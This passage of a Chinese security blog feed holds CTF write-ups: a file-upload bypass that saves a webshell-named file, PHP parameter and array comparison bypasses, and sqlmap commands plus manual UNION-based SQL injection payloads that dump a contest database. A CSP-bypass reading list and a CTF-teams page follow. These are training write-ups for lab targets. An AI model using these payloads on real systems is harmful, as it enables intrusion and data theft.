class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pathinfo — 返回文件路径的信息(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7)</p><p>pathinfo() 函数以数组的形式返回关于文件路径的信息。</p><p>返回的数组元素如下：</p><ul><li>[dirname]</li><li>[basename]</li><li>[extension]</li></ul><p>语法</p><blockquote><p>pathinfo(path,options)</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要检查的路径。</td></tr><tr><td>options</td><td>可选。规定要返回的数组元素。默认是 all。<br>可能的值：<br>PATHINFO_DIRNAME - 只返回 dirname<br>PATHINFO_BASENAME - 只返回 basename<br>PATHINFO_EXTENSION - 只返回 extension</td></tr></tbody></table><h4 id="pass-13"><a href="#pass-13" class="headerlink" title="pass"></a>pass</h4><p>大小写绕过</p><p>save_name修改为<code>caidao19.php.</code>即可 </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/1530613222876.png" alt="1530613222876"></p><p>参考writeup：</p><p><a href="https://fuping.site/2018/06/04/upload-labs-writeup/" target="_blank" rel="noopener">https://fuping.site/2018/06/04/upload-labs-writeup/</a></p><p><a href="https://github.com/LandGrey/upload-labs-writeup" target="_blank" rel="noopener">https://github.com/LandGrey/upload-labs-writeup</a></p><p><a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">当php邂逅windows通用上传缺陷</a></p><p><a href="https://blog.csdn.net/qq_33020901/article/details/78952684" target="_blank" rel="noopener">https://blog.csdn.net/qq_33020901/article/details/78952684</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;c0ny1师傅写的upload-labs，受益良多&lt;/p&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="upload" scheme="http://blog.Lhaihai.wang/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>2018安恒五月月赛WriteUp</title>
    <link href="http://blog.Lhaihai.wang/2018/05/22/2018%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E6%9C%88%E8%B5%9BWriteUp/"/>
    <id>http://blog.Lhaihai.wang/2018/05/22/2018安恒五月月赛WriteUp/</id>
    <published>2018-05-22T15:18:21.000Z</published>
    <updated>2018-05-22T15:23:14.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><blockquote><p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。 </p></blockquote><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> A_A,too small</span><br></pre></td></tr></table></figure><p>分析一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>;</span><br></pre></td></tr></table></figure><p>如果有get参数A_A，就把A_A的值赋给$str</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。 </p><p>$_SERVER[“QUERY_STRING”]获取查询语句，实例中可知，获取的是?后面的值 </p><p>例如<code>http://101.71.29.5:10007/?A_A=1</code></p><p>$_SERVER[“QUERY_STRING”]的值是：<code>A_A=1</code></p><p>那么怎么绕过这个strpos并且把$str赋值呢？</p><p>我们来了解一下下面这个php特性</p><blockquote><p>php自身在解析请求的时候，如果参数名字中包含” “、”.”、”[“这几个字符，会将他们转换成下划线。 那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php先将user.id转换成user_id，即为/t.php?user_id=11111&amp;user_id=22222 ，再获取到的<code>$_REQUEST[&#39;user_id&#39;]</code>就是22222。 </p></blockquote><p>那么这里绕过可以用A.A,A+A(这道题测试+也是可以绕过)</p><p><a href="https://blog.csdn.net/iamtheodore/article/details/6098521" target="_blank" rel="noopener">PHP获取当前url路径的函数及服务器变量:QUERY_STRING、REQUEST_URI、SCRIPT</a> </p><p><a href="https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/" target="_blank" rel="noopener">https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这里判断</p><p>$str不能小于9999999999，</p><p>(string)$str不能大于0</p><p>贴一下xsser直播讲解的例子，我们可以看到 []&gt;9999999是真，[]&gt;-1也是真，反过来就是[]&lt;999999为假</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526966811732.png" alt="1526966811732"></p><p>自己再测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump([]&lt;<span class="number">999999</span>);</span><br><span class="line">var_dump((string)[]);</span><br><span class="line">var_dump((string)[]&gt;<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">boolean false</span><br><span class="line">string &apos;Array&apos; (length=5)</span><br><span class="line">boolean false</span><br></pre></td></tr></table></figure><p>我们可以看到 (string)[]，php会把数组经过string转换后变为  </p><p> 值为Array的string类型</p><p>因为当字符串和数字比较时，php会把字符串转换为int类型，如果字符串开头是字符，就转换为0</p><p>这样就绕过了<code>elseif ((string)$str&gt;0)</code></p><p>不理解的话再放xsser的两张ppt</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968028071.png" alt="1526968028071"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968048447.png" alt="1526968048447"></p><p>最后总结一下：</p><blockquote><ol><li>用 <code>A.A</code>绕过<code>if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !==false)</code></li><li>用数组绕过 <code>($str&lt;9999999999)</code>  和 <code>((string)$str&gt;0)</code></li></ol></blockquote><p>playload</p><blockquote><p><a href="http://101.71.29.5:10007/?A+A[]=1" target="_blank" rel="noopener">http://101.71.29.5:10007/?A+A[]=1</a></p></blockquote><p>查看源代码即可看到flag</p><blockquote><p>flag={09bc24026c987ae44a6e424479b2e3} </p></blockquote><p><a href="https://blog.csdn.net/wy_97/article/details/79088218" target="_blank" rel="noopener">PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</a> </p><h2 id="不能注册的admin"><a href="#不能注册的admin" class="headerlink" title="不能注册的admin"></a>不能注册的admin</h2><blockquote><p>你敢注册一个“admin”账户吗？敢吗？你试试？ </p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968952854.png" alt="1526968952854"></p><p>查看源代码发现有一段js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">id = $(<span class="string">"#uid"</span>).val();</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">"#uid"</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(id !== <span class="string">""</span>|| !id)&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span class="string">"json.php"</span>,<span class="attr">type</span>:<span class="string">'post'</span>,<span class="attr">data</span>:&#123;<span class="string">'id'</span>:id&#125;,<span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> data = <span class="built_in">eval</span>(<span class="string">'('</span> +d +<span class="string">')'</span>);</span><br><span class="line"><span class="keyword">if</span>(data[<span class="string">'id'</span>] !=<span class="string">'undefined'</span> ||data[<span class="string">'id'</span>] !=<span class="string">""</span> ||data[<span class="string">'id'</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">alert(<span class="string">'用户名已存在!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>分析一波，这段代码就是把id参数post给json.php</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970455005.png" alt="1526970455005"></p><p>尝试一波注入，发现不行</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970480922.png" alt="1526970480922"></p><p>查看一下网络，发现响应头写着(Win32)，那可能是windows服务器</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970551824.png" alt="1526970551824"></p><p>想到windows大小写不敏感</p><blockquote><p>1、在window系统中，所有的文件夹或者文件名是不区分大小写的。即在同一个目录下不能同时存在名称相同大小写不一样的文件夹或者文件。</p><p>2、在压缩文件中是可以同时存在如上所述的文件的。例如：文件夹a 和 文件夹A 以及test.txt和TEST.txt是可以同时存在同一目录下的。</p></blockquote><p>补充学习：</p><p><a href="https://www.bbsmax.com/A/Ae5R4bnNzQ/的Rotten" target="_blank" rel="noopener">https://www.bbsmax.com/A/Ae5R4bnNzQ/的Rotten</a> Uploader</p><p>实验发现，在Windows系统中， &lt; 符号可以代替扩展名的一部分，如果没有扩展名（没有 <strong>.</strong> ）就可以代替全部。</p><p>例如此目录下有 index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">D:\www\test&gt;type &quot;index&lt;&quot;</span><br><span class="line">系统找不到指定的文件。</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index&lt;&quot;</span><br><span class="line">系统找不到指定的文件。</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.p&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.php&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.php&lt;&lt;&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br></pre></td></tr></table></figure><p>于是把php改为phP，就可以注入了</p><p>先上sqlmap</p><p>获取数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --dbs -p id --thread 10</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526969664379.png" alt="1526969664379"></p><p>拿到当前数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin <span class="comment">--flush -p id --thread 10 --current-db</span></span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526969882637.png" alt="1526969882637"></p><p>获得表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --flush -p id --thread 10 --current-db -D 5monthweb --tables</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970077793.png" alt="1526970077793"></p><p>拿到表里面的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --flush -p id --thread 10 --current-db -D 5monthweb -T article --dump</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970228303.png" alt="1526970228303"></p><p>尝试手动注入一波</p><p>单引号没反应</p><p>双引号报错了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught exception &apos;Exception&apos; with message &apos;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;&apos; at line 1 query: select * from article where title =&quot;admin&quot; &quot;&apos; in E:\apache2\htdocs\MysqliDb.php:1926 Stack trace: #0 E:\apache2\htdocs\MysqliDb.php(516): MysqliDb-&gt;_prepareQuery() #1 E:\apache2\htdocs\MysqliDb.php(550): MysqliDb-&gt;rawQuery(&apos;select * from a...&apos;, NULL) #2 E:\apache2\htdocs\json.php(39): MysqliDb-&gt;rawQueryOne(&apos;select * from a...&apos;) #3 &#123;main&#125; thrown in E:\apache2\htdocs\MysqliDb.php on line 1926</span><br></pre></td></tr></table></figure><p>发现这一句，要用双引号闭合</p><blockquote><p>select * from article where title =”admin” “‘ in </p></blockquote><p>order by 判断一下，4的时候错误，那就说明表有三列</p><blockquote><p>id=admin” order by 3%23</p></blockquote><p>把admin随便换一个，这样前面没有数据就会把union select的值输出，这里发现把1和2输出</p><blockquote><p>id=-“ union select 1,2,3%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526971766987.png" alt="1526971766987"></p><p>获得数据库 5monthweb</p><blockquote><p>id=-“ union select user(),database(),3%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526971888625.png" alt="1526971888625"></p><p>获得表名 article </p><blockquote><p>id=-“ union select user(),table_name,3 from information_schema.tables where table_schema = database()%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972049073.png" alt="1526972049073"></p><p>获得列名 id,title,content </p><blockquote><p>id=-“ union select user(),group_concat(column_name),3 from information_schema.columns where table_schema = database()%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972166936.png" alt="1526972166936"></p><p>得表里面的数据</p><blockquote><p>id=-“ union select user(),concat_ws(char(32,58,32),id,title,content),3 from 5monthweb.article %23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972278977.png" alt="1526972278977"></p><blockquote><p>flag{you_are_admin}</p></blockquote><p>附上安恒杯月赛讲解视频链接</p><blockquote><p>直播地址：<a href="http://study.163.com/course/courseMain.htm?courseId=1004945010&amp;share=2&amp;shareId=400000000254024" target="_blank" rel="noopener">http://study.163.com/course/courseMain.htm?courseId=1004945010&amp;share=2&amp;shareId=400000000254024</a> </p><p>解题讲师：你们最最熟悉的xsser老师 </p></blockquote><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="wifi密码是多少"><a href="#wifi密码是多少" class="headerlink" title="wifi密码是多少"></a>wifi密码是多少</h2><blockquote><p>你猜猜 咱们的wifi密码是多少？ 你懂操作系统吗 哈哈哈哈  </p></blockquote><p>文件：5afea37acccbc.bin</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526805894626.png" alt="1526805894626"></p><blockquote><p>flag{Y0ung_m4n_u_are_s0_coo1!}</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;奇怪的恐龙特性&quot;&gt;&lt;a href=&quot;#奇怪的恐龙特性&quot; class=&quot;headerlink&quot; title=&quot;奇怪的恐龙特性&quot;&gt;&lt;/a&gt;奇怪的恐龙特性&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。 &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="Web" scheme="http://blog.Lhaihai.wang/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>CSP学习笔记</title>
    <link href="http://blog.Lhaihai.wang/2018/05/20/CSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://blog.Lhaihai.wang/2018/05/20/CSP学习笔记/</id>
    <published>2018-05-20T14:41:21.000Z</published>
    <updated>2018-05-20T16:25:46.389Z</updated>
    
    <content type="html"><![CDATA[<p>阮一峰：<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">Content Security Policy 入门教程</a></p><p><a href="https://en.wikipedia.org/wiki/Content_Security_Policy" target="_blank" rel="noopener">Content Security Policy</a></p><p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">通过浏览器缓存来bypass CSP script nonce</a></p><p>梅子酒： <a href="https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw" target="_blank" rel="noopener">使用 Wave 文件绕过 CSP 策略</a></p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;阮一峰：&lt;a href=&quot;http://www.ruanyifeng.com/blog/2016/09/csp.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Content Security Policy 入门教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Content_Security_Policy&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Content Security Policy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://lorexxar.cn/2017/05/16/nonce-bypass-script/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;通过浏览器缓存来bypass CSP script nonce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;梅子酒： &lt;a href=&quot;https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;使用 Wave 文件绕过 CSP 策略&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.Lhaihai.wang/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CSP" scheme="http://blog.Lhaihai.wang/tags/CSP/"/>
    
  </entry>
  
  <entry>
    <title>国内外杰出的CTF战队（持续更新）</title>
    <link href="http://blog.Lhaihai.wang/2018/05/20/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F/"/>
    <id>http://blog.Lhaihai.wang/2018/05/20/国内外杰出的CTF战队/</id>
    <published>2018-05-20T14:40:46.000Z</published>
    <updated>2018-05-20T16:34:02.237Z</updated>
    
    <content type="html"><![CDATA[<p>因为觉得自己和同学只是会打打CTF，对国际和国内一些Team不是很了解，特地开了这篇博客,本文的资料均来自下方链接，目前主要内容来自 公众号：<a href="javascript:void(0" target="_blank" rel="noopener">腾讯安全联合实验室</a>;) ，<a href="https://www.xctf.org.cn/" target="_blank" rel="noopener">XCTF社区</a></p><a id="more"></a><p><a href="https://mp.weixin.qq.com/s/QdwpnVdz4fV0qJKTgoMO9w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/QdwpnVdz4fV0qJKTgoMO9w</a></p><p><a href="https://mp.weixin.qq.com/s/Fp7Ja_nzIHy84yeWRi6l0Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Fp7Ja_nzIHy84yeWRi6l0Q</a></p><p><a href="https://www.leiphone.com/news/201706/9KnCeQQXC1vrHVrt.html" target="_blank" rel="noopener">https://www.leiphone.com/news/201706/9KnCeQQXC1vrHVrt.html</a></p><h3 id="蓝莲花战队"><a href="#蓝莲花战队" class="headerlink" title="蓝莲花战队"></a>蓝莲花战队</h3><p>蓝莲花（Blue-Lotus）战队是一支源自清华大学的网络安全技术竞赛和研究团队，是中国参与CTF（Capture The Flag）网络安全技术竞赛成绩最为突出的一支国际知名战队。</p><p>2013年成为华人世界历史上首支成功闯入DEFCON黑客大会 CTF全球总决赛[1] 的队伍，并获得安全宝冠名赞助。2014年连续第二次入围DEFCON 